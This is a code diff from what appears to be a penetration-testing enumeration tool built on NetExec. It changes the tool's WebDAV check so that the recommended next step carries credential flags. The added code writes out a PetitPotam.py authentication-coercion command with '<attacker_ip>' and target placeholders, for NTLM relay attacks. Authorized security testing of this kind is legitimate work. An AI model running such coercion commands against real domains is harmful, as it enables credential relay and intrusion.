@@ -6,6 +6,7 @@ from ..core.colors import Colors, c
 from ..core.output import JSON_DATA, debug_nxc, output, print_section, status
 from ..core.runner import run_nxc
 from ..parsing.nxc_output import is_nxc_noise_line
+from ..reporting.next_steps import get_external_tool_auth
 
 # Patterns for verbose output parsing
 RE_WEBDAV_LINE = re.compile(r"WEBDAV\s+(\S+)\s+(\d+)\s+(\S+)\s+(.*)", re.IGNORECASE)
@@ -208,10 +209,21 @@ def enum_webdav(args, cache):
                 output(f"  {endpoint}")
 
         # Add coercion recommendation
+        # PetitPotam uses impacket-style auth
+        impacket_auth = get_external_tool_auth(args, cache, tool="impacket")
+        cred_format = impacket_auth["credential_format"]
+        auth_flags = impacket_auth["auth_string"]
+        if auth_flags:
+            petitpotam_cmd = f"PetitPotam.py {auth_flags} {cred_format} <attacker_ip> {target}"
+        else:
+            petitpotam_cmd = f"PetitPotam.py {cred_format} <attacker_ip> {target}"
+        petitpotam_desc = "Coerce authentication via WebDAV for relay attacks"
+        if impacket_auth["alt_auth_hint"]:
+            petitpotam_desc += impacket_auth["alt_auth_hint"]
         cache.add_next_step(
             finding="WebClient service running",
-            command=f"PetitPotam.py -u '<user>' -p '<pass>' <attacker_ip> {target}",
-            description="Coerce authentication via WebDAV for relay attacks",
+            command=petitpotam_cmd,
+            description=petitpotam_desc,
             priority="high",
         )
     else:
